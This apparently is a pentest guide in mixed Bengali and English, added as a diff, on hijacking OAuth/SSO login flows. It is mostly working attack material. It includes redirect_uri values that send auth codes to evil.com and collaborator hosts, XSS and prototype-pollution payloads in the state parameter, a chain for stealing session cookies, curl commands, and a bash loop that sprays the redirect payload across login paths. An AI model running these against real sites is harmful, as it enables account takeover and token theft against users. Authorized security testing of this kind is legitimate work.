@@ -1,0 +1,140 @@
+
+External Authentication Injection (OAuth/SSO Content Spoofing) - এটা high impact bug। Authorized pentest এর জন্য perfect। OAuth flow hijack + content manipulation chain।
+
+🎯 Target Scope (OAuth/SSO)
+1. Google/Facebook/GitHub login flows
+2. "Login with {Provider}" buttons
+3. Callback URLs: /auth/callback, /oauth/redirect
+4. SSO endpoints: /saml, /oidc/callback
+5. Profile linking: "Connect Google account"
+
+🔍 Attack Surface
+Primary Vectors
+1. redirect_uri manipulation
+2. state parameter injection  
+3. User info display (name/email spoofing)
+4. Post-auth landing pages
+5. Error pages with user data
+
+🛠️ Step-by-Step Testing
+Step 1: OAuth Flow Mapping
+1. Intercept login flow (Burp Proxy)
+2. Identify parameters:
+   ?client_id=...
+   &redirect_uri=...
+   &state=...
+   &scope=...
+
+3. Note callback URL pattern
+
+Step 2: redirect_uri Injection
+bash
+# Original flow
+GET /auth/google?redirect_uri=https://target.com/auth/callback
+
+# Injection attempt
+redirect_uri=https://evil.com/steal-token
+redirect_uri=https://target.com/evil-callback
+redirect_uri=https://evil.com%23target.com/auth/callback
+
+Step 3: Content Spoofing in User Data
+# Provider থেকে return হওয়া data manipulate
+GET /auth/callback?code=AUTH_CODE&state=EVIL_PAYLOAD
+
+# state parameter HTML injection
+state=<img src=x onerror=alert(document.domain)>
+state={"name": "<script>steal_token()</script>"}
+🔥 Exploitation Chains
+
+Chain 1: Token Theft + Spoofing
+1. BLH: target.com/js/oauth.js → 404 → evil.com/js/oauth.js
+2. Login → /auth/google?redirect_uri=evil.com/fake-callback
+3. Provider redirects to evil.com with auth_code
+4. evil.com forwards to target.com + injects malicious JS
+5. JS steals session/cookies in target.com context
+
+Chain 2: Admin Profile Spoofing
+1. Connect Google account as normal user
+2. Manipulate: name="<script src=/js/admin.js></script>"
+3. Public profile shows spoofed admin interface
+4. Victims click "fake admin links"
+
+🧪 Burp Testing Workflow
+1. Flow Interception
+Proxy → Catch OAuth requests
+Repeater → Manipulate redirect_uri/state
+Collaborator → External callback tracking
+
+2. Parameter Fuzzing
+Intruder payloads:
+§§§target.com/evil
+https://§§§.oastify.com
+javascript:steal()
+target.com%23§§§.evil.com
+
+cURL OAuth Testing
+bash
+# redirect_uri bypass
+curl -G "https://target.com/auth/google" \
+  --data-urlencode "redirect_uri=https://collaborator.oastify.com/callback"
+
+# state injection
+curl -G "https://target.com/auth/callback" \
+  --data-urlencode "state=<svg onload=alert(1)>"
+
+💥 Impact Demonstration
+Safe PoC Chain
+1. Start: /auth/google (normal flow)
+2. Intercept: Modify redirect_uri → collaborator.oastify.com
+3. Provider redirect → Collaborator hit (code/token exposed)
+4. Forward to: target.com/callback + malicious state payload
+5. Execute: <img src="https://target.com/js/hijacked.js">
+6. Proof: Collaborator interaction + JS execution screenshot
+
+📋 Report Template
+
+Title: External Authentication Injection → Account Takeover
+Components: OAuth Content Spoofing + redirect_uri Bypass
+Attack Chain:
+1. BLH: target.com/js/auth.js (404)
+2. redirect_uri → evil.com/steal
+3. Token exfiltration + spoofed callback
+4. Session hijack in trusted context
+
+CVSS: 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+
+🔄 Advanced Vectors
+1. Open Redirect + OAuth
+redirect_uri=https://target.com/redirect?url=https://evil.com
+→ Double redirect → Token exposure
+
+2. State Parameter Deserialization
+state=php://filter/convert.base64-encode|...
+state={"__proto__": {"admin": true}}
+
+3. Provider-Specific Bypass
+Google: redirect_uri[]=evil.com (array bypass)
+GitHub: state parameter truncation
+
+🚀 Automation
+bash
+#!/bin/bash
+OAUTH_PATHS=(
+  "/auth/google" "/login/github" "/sso/oidc"
+  "/oauth/facebook" "/connect/apple"
+)
+
+for path in "${OAUTH_PATHS[@]}"; do
+  echo "[*] Testing: $path"
+  curl -s -G "https://target.com$path" \
+    --data-urlencode "redirect_uri=https://oastify.com/evil" \
+    | grep -i "callback\|redirect"
+done
+
+⚠️ Detection Checklist
+✅ redirect_uri accepts external domains
+✅ state parameter renders as HTML  
+✅ OAuth JS/CSS 404 (BLH opportunity)
+✅ Post-auth pages execute user-controlled JS
+✅ Provider callback lacks origin validation
+Pentest Pro Tip: সব "Connect {Provider}" button এর complete flow intercept করো। Token exchange endpoint গুলো goldmine। Admin dashboard এ OAuth integration চেক করো priority।
